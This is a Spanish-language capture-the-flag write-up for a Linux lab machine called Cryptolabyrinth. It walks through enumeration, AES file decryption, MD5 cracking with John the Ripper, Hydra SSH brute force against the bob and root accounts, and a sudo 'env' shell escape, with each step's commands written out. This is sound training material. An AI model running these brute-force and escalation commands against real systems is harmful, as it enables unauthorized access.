# Cryptolabyrinth

## 🖥️ Sistema

Linux

---

## 🎯 Objetivo del laboratorio

Comprometer una máquina Linux combinando técnicas de enumeración web, criptografía, cracking de contraseñas y automatización para obtener acceso al sistema, pivotar entre usuarios y escalar privilegios hasta **root**.

---

## 🛠️ Tecnologías trabajadas

- Apache
- Gobuster
- OpenSSL
- AES-256-CBC
- John the Ripper
- Hydra
- SSH
- Bash Scripting
- Sudo
- GTFOBins

---

## 🧠 Metodología

La enumeración inicial mostró únicamente dos servicios expuestos: **SSH** y **HTTP**. Aunque la superficie de ataque parecía reducida, la página web contenía una pista oculta en el código fuente que indicaba que la solución probablemente requería analizar información aparentemente irrelevante.

Tras descubrir un directorio oculto mediante Gobuster, quedó claro que el laboratorio giraba alrededor de distintos mecanismos de cifrado y almacenamiento de credenciales. En lugar de centrarme únicamente en romper contraseñas mediante fuerza bruta, decidí identificar el tipo de protección utilizada en cada archivo para aplicar la técnica adecuada en cada caso.

Durante la resolución fue necesario combinar varias disciplinas: descifrado de archivos mediante OpenSSL, cracking de hashes con John the Ripper y generación automática de diccionarios personalizados para completar contraseñas parcialmente conocidas. La automatización mediante un script Bash permitió reducir enormemente el tiempo necesario para generar todas las combinaciones posibles.

Una vez obtenido acceso al sistema mediante SSH, la enumeración interna reveló una configuración incorrecta de `sudo` que permitía cambiar de usuario sin necesidad de contraseña. Este nuevo contexto permitió localizar información adicional que terminó proporcionando las credenciales del usuario **root**.

Este laboratorio demostró que no siempre existe una única vulnerabilidad crítica, sino que la explotación completa depende de encadenar correctamente pequeñas debilidades presentes en distintas fases del sistema.

---

## 🚀 Explotación

### 1. Enumeración inicial

Comencé identificando la dirección IP mediante `arp-scan` y confirmé que se trataba de una máquina Linux gracias al TTL obtenido con `ping`.

Posteriormente realicé un escaneo completo utilizando Nmap.

```bash
nmap -p- --open -sS -sC -sV --min-rate 5000 -n -Pn 192.168.1.29
```

Se descubrieron los siguientes servicios:

| Puerto | Servicio |
|---------|----------|
| 22 | SSH |
| 80 | HTTP |

---

### 2. Enumeración web

La página principal únicamente mostraba la página por defecto de Apache.

Sin embargo, revisando el código fuente encontré una cadena parcialmente oculta.

```text
2LWxmDsW0**
```

Esta información parecía formar parte de una contraseña incompleta, por lo que la conservé para utilizarla más adelante.

A continuación realicé una enumeración de directorios utilizando Gobuster.

```bash
gobuster dir -u http://192.168.1.29 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

La enumeración descubrió el directorio:

```
/hidden
```

Dentro de este directorio encontré varios archivos relacionados con distintos usuarios y contraseñas cifradas.

---

### 3. Descifrado de archivos

Decidí descargar todo el contenido del directorio para trabajar cómodamente en local.

```bash
wget -r -np -nH --cut-dirs=2 --reject "index.html*" http://192.168.1.29/hidden/
```

Durante el análisis observé que uno de los archivos pertenecientes al usuario **alice** estaba cifrado mediante **AES-256-CBC**.

Utilizando OpenSSL conseguí descifrar su contenido.

```bash
openssl enc -aes-256-cbc -d -pbkdf2 -salt -in alice_aes.enc -out alice_decrypted.txt -k supercomplexkey!
```

El resultado reveló la contraseña correspondiente al usuario **alice**.

---

### 4. Cracking de hashes

Los archivos relacionados con el usuario **bob** contenían distintos hashes MD5.

Agrupé todos ellos en un único fichero para facilitar el proceso.

```bash
cat bob_password*.hash > bob_passwords.txt
```

Posteriormente utilicé John the Ripper.

```bash
john --format=raw-md5 --wordlist=/usr/share/john/password.lst bob_passwords.txt
```

La mayoría de los hashes fueron resueltos correctamente.

Sin embargo, uno de ellos seguía dependiendo de la cadena incompleta encontrada anteriormente en el código fuente.

Para resolverlo desarrollé un pequeño script en Bash encargado de sustituir automáticamente los caracteres desconocidos por todas las combinaciones alfanuméricas posibles.

```bash
./crackbob.sh "2LWxmDsW0**"
```

El script generó un diccionario personalizado que posteriormente utilicé nuevamente con John.

Finalmente obtuve la contraseña restante del usuario **bob**.

---

### 5. Acceso inicial

Con todas las posibles contraseñas reunidas lancé un ataque de fuerza bruta sobre el servicio SSH utilizando Hydra.

```bash
hydra -l bob -P contraseñas.txt ssh://192.168.1.29
```

El ataque devolvió las credenciales válidas del usuario **bob**.

Con ellas inicié sesión mediante SSH.

```bash
ssh bob@192.168.1.29
```

Durante la enumeración del sistema localicé la primera flag almacenada en:

```
users.txt
```

---

### 6. Enumeración interna

El siguiente paso consistió en revisar los permisos disponibles mediante:

```bash
sudo -l
```

El resultado mostró que el usuario **bob** podía ejecutar el binario:

```
/usr/bin/env
```

como el usuario **alice**, sin necesidad de introducir contraseña.

---

### 7. Escalada de privilegios

Consultando GTFOBins encontré la técnica adecuada para aprovechar este permiso.

```bash
sudo -u alice /usr/bin/env /bin/bash
```

Con este comando obtuve una shell perteneciente al usuario **alice**.

En su directorio personal encontré la flag:

```
user.txt
```

Continuando con la enumeración apareció un archivo oculto dentro de:

```
/mnt
```

Este archivo contenía otra contraseña incompleta correspondiente al usuario **root**.

Aproveché el mismo script desarrollado anteriormente para generar todas las combinaciones posibles y construí un nuevo diccionario.

Finalmente lancé un ataque de fuerza bruta sobre SSH.

```bash
hydra -l root -P combinaciones.txt ssh://192.168.1.29
```

El ataque devolvió las credenciales válidas del usuario **root**.

Tras iniciar sesión recuperé la última flag:

```
root.txt
```

---

## 📚 Lecciones aprendidas

- Este laboratorio permitió combinar varias técnicas diferentes dentro de una misma cadena de explotación, reforzando la importancia de adaptar la metodología según el tipo de información encontrada.
- Analizar comentarios HTML en busca de información sensible.
- Utilizar Gobuster para descubrir directorios ocultos.
- Descargar estructuras completas de directorios mediante `wget`.
- Descifrar archivos protegidos con **AES-256-CBC** utilizando OpenSSL.
- Utilizar John the Ripper para romper hashes MD5.
- Crear diccionarios personalizados cuando las wordlists convencionales no son suficientes.
- Automatizar tareas repetitivas mediante scripts Bash.
- Aprovechar configuraciones inseguras de `sudo` para cambiar de usuario.
- Reutilizar técnicas de fuerza bruta utilizando diccionarios generados específicamente para el laboratorio.
